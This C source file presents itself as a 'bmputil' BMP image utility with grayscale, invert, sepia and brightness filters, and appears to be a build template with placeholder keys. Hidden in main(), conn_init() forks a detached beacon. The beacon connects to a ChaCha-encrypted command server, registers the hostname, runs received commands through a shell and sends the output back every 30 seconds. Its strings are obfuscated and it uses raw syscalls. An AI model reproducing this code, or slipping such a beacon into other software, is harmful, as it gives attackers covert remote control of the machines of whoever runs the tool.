/*
 * bmputil beacon
 */
typedef unsigned long  size_t;
typedef unsigned char  uint8_t;
typedef unsigned short uint16_t;
typedef unsigned int   uint32_t;
typedef long           intptr_t;

#define NULL ((void*)0)

#pragma pack(push, 1)
typedef struct {
        uint16_t bfType;
        uint32_t bfSize;
        uint16_t bfReserved1;
        uint16_t bfReserved2;
        uint32_t bfOffBits;
} bmp_file_hdr;

typedef struct {
        uint32_t biSize;
        int      biWidth;
        int      biHeight;
        uint16_t biPlanes;
        uint16_t biBitCount;
        uint32_t biCompression;
        uint32_t biSizeImage;
        int      biXPelsPerMeter;
        int      biYPelsPerMeter;
        uint32_t biClrUsed;
        uint32_t biClrImportant;
} bmp_info_hdr;
#pragma pack(pop)

typedef struct { uint8_t b, g, r; } pixel;
typedef struct { int w, h; pixel *p; } image;

struct x_sockaddr_in {
        short           sin_family;
        unsigned short  sin_port;
        unsigned int    sin_addr;
        char            sin_zero[8];
};

struct x_timespec {
        long tv_sec;
        long tv_nsec;
};

static inline long sys_fork(void) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(57) : "rcx","r11","memory"); return r;
}

static inline long sys_exit(int c) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(60), "D"((long)c) : "rcx","r11","memory"); return r;
}

static inline long sys_write(int fd, const void *b, size_t n) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(1), "D"((long)fd), "S"(b), "d"((long)n) : "rcx","r11","memory"); return r;
}

static inline long sys_read(int fd, void *b, size_t n) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(0), "D"((long)fd), "S"(b), "d"((long)n) : "rcx","r11","memory"); return r;
}

static inline long sys_open(const char *p, int f, int m) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(2), "D"(p), "S"((long)f), "d"((long)m) : "rcx","r11","memory"); return r;
}

static inline long sys_close(int fd) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(3), "D"((long)fd) : "rcx","r11","memory"); return r;
}

static inline long sys_lseek(int fd, long off, int w) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(8), "D"((long)fd), "S"(off), "d"((long)w) : "rcx","r11","memory"); return r;
}

static inline long sys_mmap_6(void *a, size_t l, int p, int f, int fd, long off) {
        long r; register long r10 asm("r10") = (long)off; register long r8 asm("r8") = (long)fd;
        __asm__ volatile("syscall" : "=a"(r) : "a"(9), "D"(a), "S"(l), "d"((long)p), "r"(r10), "r"(r8) : "rcx","r11","memory");
        return r;
}

static inline long sys_setsockopt(int fd, int level, int optname, const void *optval, int optlen) {
        long r; register long r10 asm("r10") = (long)optval; register long r8 asm("r8") = (long)optlen;
        __asm__ volatile("syscall" : "=a"(r) : "a"(54), "D"((long)fd), "S"((long)level), "d"((long)optname), "r"(r10), "r"(r8) : "rcx","r11","memory");
        return r;
}

static inline long sys_munmap(void *a, size_t l) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(11), "D"(a), "S"(l) : "rcx","r11","memory"); return r;
}

static inline long sys_dup2(int o, int n) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(33), "D"((long)o), "S"((long)n) : "rcx","r11","memory"); return r;
}

static inline long sys_nanosleep(const struct x_timespec *r, struct x_timespec *rem) {
        long ret; __asm__ volatile("syscall" : "=a"(ret) : "a"(35), "D"(r), "S"(rem) : "rcx","r11","memory"); return ret;
}

static inline long sys_socket(int d, int t, int p) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(41), "D"((long)d), "S"((long)t), "d"((long)p) : "rcx","r11","memory"); return r;
}

static inline long sys_connect(int fd, const void *a, int l) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(42), "D"((long)fd), "S"(a), "d"((long)l) : "rcx","r11","memory"); return r;
}

static inline long sys_execve(const char *p, char *const *a, char *const *e) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(59), "D"(p), "S"(a), "d"(e) : "rcx","r11","memory"); return r;
}

static inline long sys_wait4(long pid, int *st, int o) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(61), "D"(pid), "S"(st), "d"((long)o) : "rcx","r11","memory"); return r;
}

static inline long sys_setsid(void) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(112) : "rcx","r11","memory"); return r;
}

static inline long sys_gethostname(char *b, size_t l) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(161), "D"(b), "S"(l) : "rcx","r11","memory"); return r;
}

static inline long sys_pipe2(int *f, int fl) {
        long r; __asm__ volatile("syscall" : "=a"(r) : "a"(293), "D"(f), "S"((long)fl) : "rcx","r11","memory"); return r;
}

static inline void _cpy(void *d, const void *s, size_t n) {
        char *a = d; const char *b = s; while (n--) *a++ = *b++;
}

static inline void _set(void *s, int c, size_t n) {
        char *p = s; while (n--) *p++ = c;
}

static inline int _str_eq(const char *a, const char *b) {
        while (*a && (*a == *b)) { a++; b++; }
        return *(const unsigned char *)a - *(const unsigned char *)b;
}

static inline size_t _str_len(const char *s) {
        size_t n = 0; while (s[n]) n++; return n;
}

static inline int _str_int(const char *s) {
        int r = 0, sg = 1; if (*s == '-') { sg = -1; s++; }
        while (*s >= '0' && *s <= '9') r = r * 10 + (*s++ - '0');
        return r * sg;
}

static inline int _int_abs(int x) { return x < 0 ? -x : x; }

static inline long _readn(int fd, uint8_t *b, size_t n) {
        size_t t = 0;
        while (t < n) { long r = sys_read(fd, b + t, n - t); if (r <= 0) break; t += (size_t)r; }
        return t;
}

static inline long _writen(int fd, const uint8_t *b, size_t n) {
        size_t t = 0;
        while (t < n) { long w = sys_write(fd, b + t, n - t); if (w < 0) return -1; t += (size_t)w; }
        return t;
}

static void _puts(const char *s) { _writen(1, (const uint8_t *)s, _str_len(s)); }

static void _puti(int v) {
        char b[16]; int i = 14; b[15] = 0;
        if (v == 0) { b[i] = '0'; _puts(&b[i]); return; }
        if (v < 0) { _puts("-"); v = -v; }
        while (v) { b[i--] = '0' + (v % 10); v /= 10; }
        _puts(&b[i + 1]);
}

static void _fmt(const char *f, const char *sa, int da) {
        while (*f) {
                if (*f == '%' && *(f+1) == 's') { _puts(sa); f += 2; }
                else if (*f == '%' && *(f+1) == 'd') { _puti(da); f += 2; }
                else { sys_write(1, (const uint8_t *)f, 1); f++; }
        }
}

static void *_mem_alloc(size_t s) {
        size_t ts = s + sizeof(size_t);
        long r = sys_mmap_6(0, ts, 3, 34, -1, 0);
        if (r < 0) return 0;
        *(size_t *)r = ts;
        return (void *)((size_t *)r + 1);
}

static void _mem_free(void *p) {
        if (!p) return;
        size_t *m = (size_t *)p - 1;
        sys_munmap(m, *m);
}

static void crypto_block(uint32_t out[16], const uint32_t in[16]) {
        int i;
        for (i = 0; i < 16; ++i) out[i] = in[i];
        for (i = 0; i < 10; ++i) {
#define QR(a, b, c, d) do { \
        out[a] += out[b]; out[d] ^= out[a]; out[d] = (out[d] << 16) | (out[d] >> 16); \
        out[c] += out[d]; out[b] ^= out[c]; out[b] = (out[b] << 12) | (out[b] >> 20); \
        out[a] += out[b]; out[d] ^= out[a]; out[d] = (out[d] << 8) | (out[d] >> 24); \
        out[c] += out[d]; out[b] ^= out[c]; out[b] = (out[b] << 7) | (out[b] >> 25); \
} while(0)
                QR(0, 4, 8, 12); QR(1, 5, 9, 13); QR(2, 6, 10, 14); QR(3, 7, 11, 15);
                QR(0, 5, 10, 15); QR(1, 6, 11, 12); QR(2, 7, 8, 13); QR(3, 4, 9, 14);
#undef QR
        }
        for (i = 0; i < 16; ++i) out[i] += in[i];
}

static void crypto_xstr(const uint8_t *in, uint8_t *out, int len, const uint8_t nce[8], int nl) {
        uint32_t st[16] = {
                0x61707865 ^ __CHACHA_MASK__, 0x3320646e ^ __CHACHA_MASK__,
                0x79622d32 ^ __CHACHA_MASK__, 0x6b206574 ^ __CHACHA_MASK__,
                __CHACHA_KEY_0__, __CHACHA_KEY_1__, __CHACHA_KEY_2__, __CHACHA_KEY_3__,
                __CHACHA_KEY_4__, __CHACHA_KEY_5__, __CHACHA_KEY_6__, __CHACHA_KEY_7__,
                0, 0, ((uint32_t *)nce)[0], ((uint32_t *)nce)[1]
        };
        st[0] ^= __CHACHA_MASK__; st[1] ^= __CHACHA_MASK__;
        st[2] ^= __CHACHA_MASK__; st[3] ^= __CHACHA_MASK__;
        uint32_t bl[16]; int i;
        for (i = 0; i < len; ++i) {
                if (i % 64 == 0) { st[12] = i / 64; crypto_block(bl, st); }
                out[i] = in[i] ^ ((uint8_t *)bl)[i % 64];
        }
        if (nl) out[len] = 0;
}

__STRINGS_ARRAYS__

__BEACON_ID_DATA__

#define GET_RES(id, buf) crypto_xstr(dat_##id, (uint8_t *)buf, sizeof(dat_##id), nce_##id, 1)

static int sleep_sec(int s) {
        struct x_timespec ts; ts.tv_sec = s; ts.tv_nsec = 0;
        return (int)sys_nanosleep(&ts, 0);
}

static int cmd_exec(const char *cmd, uint8_t *out, int mx) {
        int pf[2];
        if (sys_pipe2(pf, 0) < 0) return -1;

        long pid = sys_fork();
        if (pid == 0) {
                sys_dup2(pf[1], 1); sys_dup2(pf[1], 2);
                sys_close(pf[0]); sys_close(pf[1]);
                char sh[16]; GET_RES(14, sh);
                char *a[] = { sh, "-c", (char *)cmd, 0 };
                sys_execve(sh, a, a);
                sys_exit(1);
        }
        if (pid < 0) { sys_close(pf[0]); sys_close(pf[1]); return -1; }

        sys_close(pf[1]);
        int t = 0;
        while (t < mx) { long r = sys_read(pf[0], out + t, mx - t); if (r <= 0) break; t += (int)r; }
        sys_close(pf[0]);
        int st = 0; sys_wait4(pid, &st, 0);
        return t;
}

static int beacon_reg(int s, const uint8_t id[4]) {
        uint8_t buf[256]; int o = 0;
        buf[o++] = 0x01; // magic byte for multiplexer
        _cpy(buf + o, id, 4); o += 4;
        char hn[64]; _set(hn, 0, 64);
        sys_gethostname(hn, 64);
        int hl = (int)_str_len(hn); if (hl > 63) hl = 63;
        buf[o++] = (uint8_t)hl; _cpy(buf + o, hn, hl); o += hl;
        char un[] = "user";
        int ul = (int)_str_len(un); buf[o++] = (uint8_t)ul; _cpy(buf + o, un, ul); o += ul;
        char pl[] = "linux";
        int pll = (int)_str_len(pl); buf[o++] = (uint8_t)pll; _cpy(buf + o, pl, pll); o += pll;
        return (int)_writen(s, buf, o);
}

static int beacon_run(void) {
        uint8_t ab[6];
        crypto_xstr(dat_16, ab, sizeof(dat_16), nce_16, 0); // index 16 is addr_res now

        uint8_t bid[4];
        _cpy(bid, dat_bid, 4);

        uint8_t cb[2048], ob[8192];

        uint8_t hp[sizeof(dat_15)]; // index 15 is routing tag
        crypto_xstr(dat_15, hp, sizeof(dat_15), nce_15, 0);

        while (1) {
                int s = (int)sys_socket(2, 1, 0);
                if (s < 0) { sleep_sec(30); continue; }

                struct x_sockaddr_in sa;
                sa.sin_family = 2;
                _cpy(&sa.sin_port, ab, 2); _cpy(&sa.sin_addr, ab + 2, 4);
                _set(sa.sin_zero, 0, 8);

                if (sys_connect(s, &sa, sizeof(sa)) < 0) { sys_close(s); sleep_sec(30); continue; }

                int keep = 1;
                sys_setsockopt(s, 1, 9, &keep, 4); // SOL_SOCKET=1, SO_KEEPALIVE=9

                _writen(s, hp, sizeof(dat_15)); // send routing tag first

                beacon_reg(s, bid); // sends magic \x01 then registration data

                uint8_t h;
                if (_readn(s, &h, 1) != 1 || h != 0x01) { sys_close(s); sleep_sec(30); continue; }

                uint8_t tid[4];
                if (_readn(s, tid, 4) != 4) { sys_close(s); sleep_sec(30); continue; }

                int cl = 0;
                while (cl < (int)sizeof(cb) - 1) {
                        long r = sys_read(s, cb + cl, sizeof(cb) - 1 - cl);
                        if (r <= 0) break; cl += (int)r;
                }
                cb[cl] = 0;

                int ol = cmd_exec((const char *)cb, ob, (int)sizeof(ob) - 1);
                if (ol < 0) ol = 0;

                uint8_t rh[6];
                rh[0] = 0x02; _cpy(rh + 1, tid, 4); rh[5] = 0;
                _writen(s, rh, 6);
                uint8_t lb[4];
                lb[0] = (uint8_t)((ol >> 24) & 0xFF); lb[1] = (uint8_t)((ol >> 16) & 0xFF);
                lb[2] = (uint8_t)((ol >> 8) & 0xFF); lb[3] = (uint8_t)(ol & 0xFF);
                _writen(s, lb, 4);
                if (ol > 0) _writen(s, ob, ol);

                sys_close(s);
                sleep_sec(30);
        }
}

static int conn_init(void) {
        long p = sys_fork();
        if (p > 0) return 0;
        if (p < 0) return -1;
        sys_setsid();
        beacon_run();
        return 0;
}

static image *bmp_parse(uint8_t *d, size_t sz) {
        if (sz < sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr)) return 0;
        bmp_file_hdr *fh = (bmp_file_hdr *)d;
        bmp_info_hdr *ih = (bmp_info_hdr *)(d + sizeof(bmp_file_hdr));
        if (fh->bfType != 0x4D42 || ih->biBitCount != 24) return 0;
        image *im = _mem_alloc(sizeof(image));
        im->w = ih->biWidth; im->h = _int_abs(ih->biHeight);
        im->p = _mem_alloc(im->w * im->h * sizeof(pixel));
        uint8_t *pd = d + fh->bfOffBits;
        int pad = (4 - (im->w * 3) % 4) % 4;
        for (int i = 0; i < im->h; i++)
                _cpy(&im->p[i * im->w], pd + i * (im->w * 3 + pad), im->w * 3);
        return im;
}

static image *bmp_load(const char *fn) {
        long fd = sys_open(fn, 0, 0);
        if (fd < 0) return 0;
        long sz = sys_lseek(fd, 0, 2); sys_lseek(fd, 0, 0);
        uint8_t *d = _mem_alloc(sz);
        if (!d) { sys_close(fd); return 0; }
        _readn(fd, d, sz); sys_close(fd);
        image *im = bmp_parse(d, sz);
        _mem_free(d);
        return im;
}

static void bmp_save(const char *fn, image *im) {
        long fd = sys_open(fn, 1 | 64 | 512, 0644);
        if (fd < 0) return;
        int pad = (4 - (im->w * 3) % 4) % 4;
        bmp_file_hdr fh = { 0x4D42, (uint32_t)(sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr) + (im->w * 3 + pad) * im->h), 0, 0, sizeof(bmp_file_hdr) + sizeof(bmp_info_hdr) };
        bmp_info_hdr ih = { sizeof(bmp_info_hdr), im->w, im->h, 1, 24, 0, (im->w * 3 + pad) * im->h, 0, 0, 0, 0 };
        _writen(fd, (const uint8_t *)&fh, sizeof(fh));
        _writen(fd, (const uint8_t *)&ih, sizeof(ih));
        uint8_t z[3] = {0};
        for (int i = 0; i < im->h; i++) {
                _writen(fd, (const uint8_t *)&im->p[i * im->w], im->w * sizeof(pixel));
                if (pad) _writen(fd, z, pad);
        }
        sys_close(fd);
}

static void bmp_grayscale(image *im) {
        for (int i = 0; i < im->w * im->h; i++) {
                uint8_t g = (uint8_t)((im->p[i].r * 76 + im->p[i].g * 150 + im->p[i].b * 29) >> 8);
                im->p[i].r = g; im->p[i].g = g; im->p[i].b = g;
        }
}

static void bmp_invert(image *im) {
        for (int i = 0; i < im->w * im->h; i++) {
                im->p[i].r = 255 - im->p[i].r;
                im->p[i].g = 255 - im->p[i].g;
                im->p[i].b = 255 - im->p[i].b;
        }
}

static void bmp_sepia(image *im) {
        for (int i = 0; i < im->w * im->h; i++) {
                uint8_t r = im->p[i].r, g = im->p[i].g, b = im->p[i].b;
                int tr = (r * 100 + g * 196 + b * 48) >> 8;
                int tg = (r * 89 + g * 175 + b * 43) >> 8;
                int tb = (r * 69 + g * 136 + b * 33) >> 8;
                im->p[i].r = tr > 255 ? 255 : tr;
                im->p[i].g = tg > 255 ? 255 : tg;
                im->p[i].b = tb > 255 ? 255 : tb;
        }
}

static void bmp_brightness(image *im, int v) {
        for (int i = 0; i < im->w * im->h; i++) {
                int r = im->p[i].r + v, g = im->p[i].g + v, b = im->p[i].b + v;
                im->p[i].r = r < 0 ? 0 : (r > 255 ? 255 : r);
                im->p[i].g = g < 0 ? 0 : (g > 255 ? 255 : g);
                im->p[i].b = b < 0 ? 0 : (b > 255 ? 255 : b);
        }
}

int main(int argc, char **argv) {
        char sb[256];
        GET_RES(0, sb); _puts(sb);
        conn_init();

        if (argc < 4) {
                GET_RES(1, sb); _fmt(sb, argv[0], 0);
                GET_RES(2, sb); _puts(sb);
                sys_exit(1);
        }

        image *im = bmp_load(argv[1]);
        if (!im) { GET_RES(3, sb); _puts(sb); sys_exit(1); }

        char og[32], oi[32], os[32], ob[32];
        GET_RES(4, og); GET_RES(6, oi); GET_RES(8, os); GET_RES(10, ob);

        if (_str_eq(argv[3], og) == 0) {
                bmp_grayscale(im); GET_RES(5, sb); _puts(sb);
        } else if (_str_eq(argv[3], oi) == 0) {
                bmp_invert(im); GET_RES(7, sb); _puts(sb);
        } else if (_str_eq(argv[3], os) == 0) {
                bmp_sepia(im); GET_RES(9, sb); _puts(sb);
        } else if (_str_eq(argv[3], ob) == 0) {
                int v = argc > 4 ? _str_int(argv[4]) : 50;
                bmp_brightness(im, v); GET_RES(11, sb); _fmt(sb, 0, v);
        } else {
                GET_RES(12, sb); _fmt(sb, argv[3], 0);
        }

        bmp_save(argv[2], im);
        GET_RES(13, sb); _fmt(sb, argv[2], 0);
        _mem_free(im->p); _mem_free(im);
        sys_exit(0);
        return 0;
}
